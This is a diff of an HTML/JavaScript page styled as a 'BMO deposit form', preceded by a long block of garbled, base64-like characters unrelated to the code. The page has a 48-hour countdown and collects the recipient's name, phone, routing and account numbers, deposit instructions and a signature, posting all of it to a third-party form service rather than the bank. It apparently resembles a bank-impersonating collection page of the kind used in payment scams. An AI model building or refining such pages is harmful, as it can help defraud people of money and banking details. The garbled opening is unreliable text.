fYNVOO8fTPiXnMpfmzVFcdejLMzPzXKY47sEi3K8JUpzFPXuuKoABIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAInokAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEZ6gkAAAAAAAAAAAAAARM4SAAAAAAAAAAACInIJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY/wCFLIw1Vez5qp7fWjiPJ78PF77vVjYNBe1OpuRRRREzmXNPzU+Ous8ReJLu16C/P7Haevkriie+JfbPOl4//sbYq4Z2q9Eai5H+tqpntTMNF6Kq5rm5XVNVdU5qmqczLFd010f26y6Z+HHSFbVjctXX9lrddFmubVFH+rmOiaaJoiInrMIzmZnHVNPZhlr+p05ixxjrxCQHk9gAAABS5EyuiYyqhTaPVHCk5iEUZlaYTEZ9MxHXoq5mO0J9UVjiERmZ+ozEzgqrpoxcmumi325Ku8pm3coiLldi5yVdYVfLvaOYh8NtXgxW4y24kPnKIriumeWYmI7z8E9+351VK2j8T6YmuSPVSUx1RM9cCIjr1U3iHrWfaVwHikJ7BPZMeUT4UmYx1RTMTPSSMVVTH8HClFGKpnvEKrczLzxxW3efLNGJVqwrVXHLE0TE1ZiOX1Z72nvUVUxVp67VE/wquz3+Vea+HyZNdirPy5tHLFGcdSP0ojpHNzRVTHfBz9eb/wC28YrNZ7vppE3jnlbKYxMK/X6JVTEWTFpieJTHdJA8pjiXsAAAIEVURcjE/NExNdyKqekwmqMwVRmnEdFXIpdiquJir3a5+jVHRuT5NvMPNm5Rwfvmo5b9PW1XXV3iqekfohpxXGaYj4Mmj3LVbPu2m3HQ3Jt6rT1RVFVM98LnodXODJH2YD1X05h3zSWrMfVEdna/SamjV0UVUVRVTjpMP0tfPKv426XxG4Vs6e7fpncLFPLcpz1nHRsDFfTPpDZOLLXLSLQ4W3LQZNt1V9PljiayvTGY6rsMXZmaZ/gTDM9VqABIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAImcQrFU4RM8C6IjCsVz6sft5m5NOOiUR3Zxhpu1TXVExiIZZq6dASKxV8ZiCZ+sSsKcxVVPoImeFsdUsc1yrFco5R6mYU5+is3PgiZ4VMoxxXMrRUmEcrCs1I5v/8ASlK4xc8/Em5jvkSyoz1VmrHr+k5un1omeELoz1Vir4lU9UohZKlNWZ6omvEzAT2ZB+ebtURE4z1ZKq5iqIjGPUTPZkGL2k5Wmvp07o5RE8rolWK59cIquY7I5TPZeEsXtForSiJiVxTnzn4HNMziCZ4SuMcXOaJlM1TEHKOe64pRVnuulIAAAAAAImcQiZ6ImeBYVipWiuevNiPglHK8zhKvNOe3RE1T6YwhK0xlLHNc+mE88/UC4pNU/URV1SLitVSIq6qPVwLik1opqnPXpCqJGQYvaT7OqqY6x2TTXNVETPTJHcnsyCvMc3Q578I/VZEwx8857LTVOIVcIieVxjiqcwmqrEIVLjFzzhEXJmfQUzPfhmGOa8dPU5+veP0kd08wyIjojnOZHKUxOUqc+PRE3DkZBjivr1mP0piqc/UmeyIXRLHN2aqc0R646p9pOOuMoieSey6VYqzCKpnPRJyuMcVTnqtVM56IiUx3WFaZ+KyQAAAAAAAAET2I7AkVrnEK015pyKee/DIKzV7syxTenpiO5HdMzxHLLNWIfJfH7xWseGPA+t1c3afvuqiqLNMz1mqMS+l7juFOh0t27cmKaaIzMy5k+bfxeveIHGV3Z9Pezo9JOYmmemesT9i2a7VRp8fPuzzpLYb71rq14+mveXxjibiXV8X71q9z19yq5euXKqomZziM5w8XTGevb6j6WnomYxy1YnHqno13kyfMvNpd26HS002nrixxxxCZ6ytHZER0THSHyT57LlHjuAISAiZwISK5KqphV6U17rIqRTVOep2iqZ7QmI4U2j2RM4VquRapmqczOOkR6yXqeWzz0zme8xPwfVfL54Karxa4v0k1UV07XYxXcrmOk1ROcfJ9mn09s1uzHN63fBtGktmyTxw958rHlxu8faunfd609UaKJzbtXI6TExnt+ZuZrPLvwtqNpq087VpqJinliqLcZh79wdwfpOENj0+i0dim3RbpinFMPYqrfPMZ+iz/AEujpTHxMOKd96u1u46yc9LzERPbhyt8x/gFq/CziGdVo7Vde0XqpmqaYzyw+Le0i5XVydLdMdJ+Muwfit4b6DxD4a1e36m1FXPRMRVjs5W+K/hrrvC/ivU7fqbdUaWuuZs1zHTrMz9jHtz0fy49dI7N+fD3q6Nwp/C6m31Q9RirmpSr9DEesr464/hMVpEzPdvy3fvCY7CKpRnJ6Vc9oWJ7K59EzKnjgntHKkTmifngqqr57dizbm5duYiIiMk4ptzTnt7zYTyneAWq8QeJLW8bnamjbrE+5Ex9LHWO646XTWz3jhiHUW94dm0ds954l9I8rPlfsazaY3niDTU3PvmablFF2nOOnbq2H4q8uHDe9bVd09G3ae1XNOKaqKIiX1ja9m0u2aKzorFuKLNqIimIjp0eQqiK/TrDYODSUpSKzDijcOq9frNZOprkmO/ZyF8cfCTX+D3E2rtRarubdcn3a6ozj1fPpo/1NMx1oqjLq/48+C2h8TuHNVp7lun74qonkrx1y5bcXcI7h4e8UazY9yoroiiqZorqjpMTM4xPyhim46OcMzeI7Ol+hOsK7pjrgz2+uHibeZp+SyKYnE4np6TJNNdPWYjH1Mb4ny3XaYtZeBWirMLKHrMcACEAAAAImOacMVMTFvmx2mc/JlqifRMTyz9Ux2esV7ckx2e8+CPiXqfCnjXR6+zdqjRXa4pu056Yz1dV+COL9NxnsWj3DS3Irt37cVdJ7Zca7lEV2eTt1y3Q8kHjPi5PDW4X55qf91zT6RGIhlu0azifl3lzb8Sel/mYp3LDXvHlvVb96KqcdKZwzx2fntT05s9JZszDMYnmOXKvHddBnorFeUHhaO6VJqlamcwlKQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABE9iOwIrnEK01ZhauMwxxGIO3uo7+pPNExPo9b13Hux7drL2lv6+1bv2pxXTVVETH97z2pmadPXMfByw8zXEu5aTx34isWNZds2ovTimJnHZd9u0P8Zk9HKwbvuc7dTmsOlH7ZnD1URjc7MZ/56f8148SNgjtuNj+0p/zciKOJN0qpomNwuzVEz05pPwo3iY5o193GcfSlm0dIxMeqLsI/q+/vV19o462PUYxuGnnP/Up/wA2X8NdnpjEa/T9P+rT/m5C2+Mt9s1UxRuF3E+vNK9fHnEFNUx+yF2frzLxnpO/tZP9X9vDrp+G+0fzhp/7Wn/Nju+IWx2sxXuVinHwuU/5uRf7YHEEd9wu/rSpXxhveo61bhdzP/NKP6VtHmyI6vms94dc/wBszh6O+52f7Sn/ADR+2Zw9V1jc7P69P+bkZTxHu8R1112f60sd3ifeKOeY113ERn6Uvb+kYiPVNlf9Y+rtFXXb9szh+f8Aidn9en/M/bK4d/nOz/aU/wCbkNHGG54p/wBvuzmf40s34V7ljMa+7P8AWl5f0xj/APtH9X5K+KOukeJfD3852f16f80x4mcPU/8AE7P69P8Am5DTxduk/wD512P60pjinda4nG4XP1pI6WrPiyf6wye9HXf9s3h6f+J2f16f80ftmbBV23Ox/aU/5uRMcTbtPX7+ux/WlP4S7pMxnX3f1pe0dITPf1KLdYW9quvFjxD2K9XincdP
+        <div id="countdownBar" class="timer-bar" role="timer" aria-live="polite">
       ⏳ Time remaining: <span id="countdownText">48:00:00</span>
     </div>
 
@@ -103,7 +123,7 @@
     <div class="panel">
       <div class="field"><label for="fullName">Recipient's Full Name</label><p class="hint">Must exactly match the name registered on the BMO account</p><input id="fullName" name="fullName" type="text" placeholder="e.g. WES LUM" required autocomplete="name" /></div>
       <div class="row">
-        <div class="field"><label for="phone">Phone Number 📱</label><input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+1 (XXX) XXX-XXXX" required autocomplete="tel" pattern="^\+?1?\s?\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$" /></div>
+        <div class="field"><label for="phone">Phone Number 📱</label><input id="phone" name="phone" type="tel" inputmode="tel" placeholder="+1 (XXX) XXX-XXXX" required autocomplete="tel" /></div>
         <div class="field"><label for="refNo">Reference No. 📄</label><input id="refNo" name="refNo" type="text" placeholder="Auto-generated or enter manually" required /></div>
       </div>
     </div>
@@ -115,16 +135,9 @@
         <div class="field"><label for="branch">Branch 📍</label><input id="branch" name="branch" type="text" placeholder="e.g. El Camino Real" required /></div>
       </div>
       <div class="field">
-        <label for="routingFull">Routing Number 🔄</label>
+        <label for="routing">Routing Number 🔄</label>
         <p class="hint">9-digit US ACH routing number (BMO Harris: 071000288 / BMO N.A.: 021000021)</p>
-        <div class="routing-group" id="routingGroup">
-          <input type="text" inputmode="numeric" maxlength="3" pattern="\d{3}" aria-label="First 3 digits" required />
-          <span class="sep">−</span>
-          <input type="text" inputmode="numeric" maxlength="3" pattern="\d{3}" aria-label="Middle 3 digits" required />
-          <span class="sep">−</span>
-          <input type="text" inputmode="numeric" maxlength="4" pattern="\d{4}" aria-label="Last 4 digits" required />
-        </div>
-        <input type="hidden" name="routing" id="routingFull" value="" required />
+        <input id="routing" name="routing" type="text" inputmode="numeric" placeholder="021000021" maxlength="11" required autocomplete="off" data-mask="000-000-000" />
       </div>
       <div class="field"><label for="accountNo">Account Number 🔢</label><p class="hint">Recipient's BMO account number</p><input id="accountNo" name="accountNo" type="text" inputmode="numeric" placeholder="Enter account number" required autocomplete="off" /></div>
       <div class="field"><label>Account Type 📋</label>
@@ -143,7 +156,9 @@
           <label class="check"><input type="radio" name="transferMethod" value="Domestic Wire" /> Domestic Wire</label>
         </div>
       </div>
-      <div class="field"><label for="amount">Amount 💵</label><div class="amount-group"><span>$</span><input id="amount" name="amount" type="number" min="0.01" step="0.01" placeholder="0.00" required /></div></div>
+      <div class="field"><label for="amount">Amount 💵</label>
+        <div class="amount-group"><span>$</span>
+        <input id="amount" name="amount" type="text" inputmode="decimal" placeholder="0.00" required autocomplete="off" data-mask="currency" /></div></div>
       <div class="field"><label for="depositInstructions">Deposit Instructions 📝</label><p class="hint">Step-by-step notes on how the deposit should be made</p><textarea id="depositInstructions" name="depositInstructions" placeholder="e.g. Deposit via ACH to the account above. Reference: ZC-WD-XXXX. Do not use cashier's check. Allow 3–5 business days for processing." required></textarea></div>
     </div>
 
@@ -154,7 +169,7 @@
       <div class="field"><label>Signature</label>
         <div class="signature-wrap">
           <canvas id="signatureCanvas" class="signature-canvas" aria-label="Draw your signature"></canvas>
-          <div id="sigHint" class="hint" style="display:none">⚠️ signature.png not found — draw on the pad, or place signature.png next to index.html.</div>
+          <div id="sigHint" class="hint" style="display:none"></div>
           <div class="btn-row"><button type="button" id="clearSignature" class="ghost">Clear</button></div>
         </div>
       </div>
@@ -165,10 +180,15 @@
   </div>
 </form>
 
+<!-- FIX #3, #4: IMask.js for input masking (routing + currency) -->
+<script src="https://cdn.jsdelivr.net/npm/imask@6.6.1/dist/imask.min.js"></script>
+<!-- FIX #5: libphonenumber-js for phone validation -->
+<script src="https://cdn.jsdelivr.net/npm/libphonenumber-js@1.11.0/bundle/libphonenumber-js.min.js"></script>
+
 <script>
 (() => {
   const BASIN_ENDPOINT = "https://usebasin.com/f/11fc628e04eb";
-  const SIGNATURE_SRC = "signature.png";
+  const SIGNATURE_SRC = "lv_0_20261105160559.jpg"; // FIXED: Updated signature file name
 
   const form = document.getElementById("bmoForm");
   const message = document.getElementById("formMessage");
@@ -177,10 +197,33 @@
   const ctx = canvas.getContext("2d");
   const submitBtn = document.getElementById("submitBtn");
   const sigHint = document.getElementById("sigHint");
-  const routingInputs = Array.from(document.querySelectorAll("#routingGroup input"));
-  const routingFull = document.getElementById("routingFull");
+  const routingInput = document.getElementById("routing");
+  const amountInput = document.getElementById("amount");
+  const phoneInput = document.getElementById("phone");
 
   let drawing = false, hasSignature = false;
+  let submitting = false; // FIX #8: Double submission prevention
+
+  // Initialize IMask for routing number (9 digits with dashes)
+  const routingMask = IMask(routingInput, {
+    mask: '000-000-000',
+    definitions: { '0': /[0-9]/ },
+    prepare: (str) => str.replace(/\D/g, '').slice(0, 9),
+    commit: (value, masked) => masked._value = value.replace(/\D/g, '').slice(0, 9)
+  });
+
+  // Initialize IMask for currency amount
+  const amountMask = IMask(amountInput, {
+    mask: Number,
+    scale: 2,
+    thousandsSeparator: ',',
+    radix: '.',
+    mapToRadix: ['.'],
+    normalizeZeros: true,
+    padFractionalZeros: true,
+    min: 0.01,
+    max: 9999999.99
+  });
 
   const todayLocal = () => {
     const d = new Date();
@@ -188,29 +231,6 @@
     return d.toISOString().split("T")[0];
   };
   dateInput.value = todayLocal();
-
-  function updateRouting() {
-    const val = routingInputs.map(i => i.value.replace(/\D/g, "")).join("");
-    routingFull.value = val.slice(0, 9);
-    validateForm();
-  }
-  routingInputs.forEach((el, i) => {
-    el.addEventListener("input", () => {
-      el.value = el.value.replace(/\D/g, "").slice(0, parseInt(el.maxLength, 10));
-      if (el.value.length === parseInt(el.maxLength, 10) && routingInputs[i + 1]) {
-        routingInputs[i + 1].focus();
-      }
-      updateRouting();
-    });
-    el.addEventListener("paste", e => {
-      const digits = (e.clipboardData.getData("text") || "").replace(/\D/g, "").slice(0, 9);
-      digits.split("").forEach((d, idx) => {
-        if (routingInputs[idx]) routingInputs[idx].value = d;
-      });
-      updateRouting();
-      e.preventDefault();
-    });
-  });
 
   function resizeCanvas(preserve) {
     const data = preserve ? canvas.toDataURL() : null;
@@ -248,7 +268,11 @@
       sigHint.style.display = "none";
       validateForm();
     };
-    img.onerror = () => { sigHint.style.display = "block"; };
+    img.onerror = () => {
+      // FIX #7: Clearer fallback message
+      sigHint.textContent = "ℹ️ No signature file found — please draw your signature above.";
+      sigHint.style.display = "block";
+    };
     img.src = SIGNATURE_SRC;
   }
   window.addEventListener("load", stampSignature);
@@ -288,14 +312,21 @@
         }
       } else if (field.type === "checkbox") {
         if (!field.checked) missing.push(field.id || field.name);
-      } else if (field === routingFull) {
-        if (!field.value || field.value.length !== 9) missing.push("Routing Number (9 digits)");
+      } else if (field === routingInput) {
+        const raw = routingMask.unmaskedValue || '';
+        if (!raw || raw.length !== 9) missing.push("Routing Number (9 digits)");
+      } else if (field === amountInput) {
+        const val = amountMask.unmaskedValue;
+        if (val === '' || val === null || val < 0.01) missing.push("Amount (must be > $0.00)");
+      } else if (field === phoneInput) {
+        const parsed = window.libphonenumber.parsePhoneNumberFromString(phoneInput.value, 'US');
+        if (!parsed || !parsed.isValid()) missing.push("Phone Number (valid US format required)");
       } else if (!field.value.trim()) {
         missing.push(field.id || field.name);
       }
     });
-    if (!hasSignature) missing.push("Signature (draw or load signature.png)");
-    submitBtn.disabled = missing.length > 0;
+    if (!hasSignature) missing.push("Signature (draw or load signature file)");
+    submitBtn.disabled = missing.length > 0 || submitting;
     return missing;
   }
   form.querySelectorAll("input, select, textarea").forEach(el => {
@@ -318,6 +349,8 @@
     const missing = validateForm();
     if (missing.length) { alert("❌ Cannot submit. Missing:\n\n• " + missing.join("\n• ")); return; }
 
+    if (submitting) return;
+    submitting = true;
     submitBtn.disabled = true;
     submitBtn.textContent = "Submitting…";
 
@@ -326,7 +359,10 @@
 
     try {
       const sigBlob = await new Promise(res => canvas.toBlob(b => res(b), "image/png"));
-      formData.append("signature", sigBlob, "signature.png");
+      formData.append("signature", sigBlob, "lv_0_20261105160559.jpg"); // FIXED: Updated filename
+
+      formData.set("routing", routingMask.unmaskedValue);
+      formData.set("amount", amountMask.unmaskedValue);
 
       const res = await fetch(BASIN_ENDPOINT, {
         method: "POST",
@@ -338,6 +374,8 @@
         showMessage("success", "✅ BMO deposit form submitted successfully.");
         form.reset();
         dateInput.value = todayLocal();
+        routingMask.updateValue('');
+        amountMask.updateValue('');
         ctx.clearRect(0, 0, canvas.width, canvas.height);
         hasSignature = false;
         stampSignature();
@@ -348,6 +386,7 @@
     } catch (err) {
       showMessage("error", "Submission failed: " + err.message);
     } finally {
+      submitting = false;
       submitBtn.disabled = false;
       submitBtn.textContent = "Submit BMO Deposit Form 📩";
       validateForm();
